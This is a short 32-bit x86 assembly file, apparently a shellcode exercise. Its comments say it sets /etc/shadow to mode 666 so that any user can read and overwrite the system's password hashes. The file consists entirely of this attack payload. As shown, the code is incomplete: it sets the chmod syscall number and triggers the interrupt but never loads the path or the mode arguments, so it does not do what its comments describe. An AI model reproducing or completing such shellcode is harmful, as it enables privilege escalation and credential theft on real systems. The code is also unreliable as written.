
; shellcode for changing the permissions of the /etc/shadow file.
; we change the permissions to 666 / -rw-rw-rw
; 32 bit

SYS_CHMOD equ		15

section .text

_start:
	; chmod(const char *pathname, mode_t mode); -> syscall number 15
	; normally: -rw-r----- 1 root shadow 1763 jan 28 23:38 /etc/shadow

	mov eax, SYS_CHMOD
	int 0x80
